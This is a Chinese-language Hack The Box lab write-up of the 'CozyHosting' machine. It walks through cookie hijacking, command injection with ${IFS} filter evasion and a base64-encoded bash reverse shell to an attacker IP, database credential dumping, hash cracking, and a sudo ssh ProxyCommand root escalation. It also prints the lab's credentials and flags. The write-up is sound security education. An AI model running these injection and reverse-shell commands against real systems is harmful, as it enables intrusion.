---
title: 'HTB: CozyHosting'
date: 2023-11-18 19:57:06
categories:
- Machines
- Lab
tags:
- HTB
- easy
---

![image-20231118195809339](../images/image-20231118195809339.png)

IP:`10.10.11.230`

nmap扫描

```bash
┌──(kali㉿kali)-[~/htb/CozyHosting]
└─$ nmap -p- 10.10.11.230 --min-rate 10000 -oN nmap_ports
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-18 07:00 EST
Warning: 10.10.11.230 giving up on port because retransmission cap hit (10).
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 46.43% done; ETC: 07:01 (0:00:32 remaining)
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.39s latency).
Not shown: 64345 closed tcp ports (conn-refused), 1187 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 67.33 seconds

```

80端口http界面

![image-20231118200354428](../images/image-20231118200354428.png)

只有login能点进去

![image-20231118200506277](../images/image-20231118200506277.png)

弱口令尝试失败

![image-20231118203151668](../images/image-20231118203151668.png)

查看error界面为Spring Boot框架

![image-20231118203401432](../images/image-20231118203401432.png)

9001端口界面

![image-20231118200316108](../images/image-20231118200316108.png)

脚本扫描

```bash
┌──(kali㉿kali)-[~/htb/CozyHosting]
└─$ nmap -p 22,80,9001 10.10.11.230 -sC -sV -T4 -oN nmap_scripts
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-18 07:02 EST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.44s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
9001/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.71 seconds

```

Web目录枚举

![image-20231118201739981](../images/image-20231118201739981.png)

枚举出的目录其中一个包含用户的JESSIONID

![image-20231118201922688](../images/image-20231118201922688.png)

用JESSIONID替换原有cookie登录admin

![image-20231118202619779](../images/image-20231118202619779.png)

存在一个提供ssh连接的功能

![image-20231118202718350](../images/image-20231118202718350.png)

填写` kali`和`vpn`地址进行尝试

![image-20231118204522133](../images/image-20231118204522133.png)

![image-20231118204627282](../images/image-20231118210019834.png)

![image-20231118205941801](../images/image-20231118205941801.png)

用` {IFS}` 替换空格

![image-20231118210826486](../images/image-20231118210826486.png)

反弹shell生成

![image-20231118205320610](../images/image-20231118205320610.png)

测试反弹shell

![image-20231118205733379](../images/image-20231118205733379.png)

将空格进行替换

```bash
echo${IFS%??}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi80MjQyIDA+JjE="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash
```

还是有空格

![image-20231118212820550](../images/image-20231118212820550.png)

URL再次编码

![image-20231118213110807](../images/image-20231118213110807.png)

在kali上开启nc监听

![image-20231118213142291](../images/image-20231118213142291.png)

安装jar查看器`jd-gui`

![image-20231118213809572](../images/image-20231118213809572.png)

![image-20231118214022742](../images/image-20231118214022742.png)

```java
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

postgresql数据库

![image-20231118214236650](../images/image-20231118214236650.png)

```
username=kanderson&password=MRdEQuv6~6P9
```

登录数据库

![image-20231118214823961](../images/image-20231118214823961.png)

```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

```

![image-20231118215050417](../images/image-20231118215050417.png)

![image-20231118215807044](../images/image-20231118215807044.png)

爆破（不知为何hashcat不能用）

![image-20231118215833354](../images/image-20231118215833354.png)

用john

![image-20231118220310517](../images/image-20231118220310517.png)

```
manchesterunited
```

ssh连接

![image-20231118220526516](../images/image-20231118220526516.png)

![image-20231118220553059](../images/image-20231118220553059.png)

user flag:

```
josh@cozyhosting:~$ cat user.txt
9d572e2bec77d894e9a30bd34e0900ed
```

root提权

![image-20231118221050991](../images/image-20231118221050991.png)

<https://gtfobins.github.io/gtfobins/ssh/#sudo>

![image-20231118221102624](../images/image-20231118221102624.png)

```
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![image-20231118221216032](../images/image-20231118221216032.png)

```
# cat root.txt
98291317931360700d3e6cac4143b765
```

![image-20231118221312689](../images/image-20231118221312689.png)
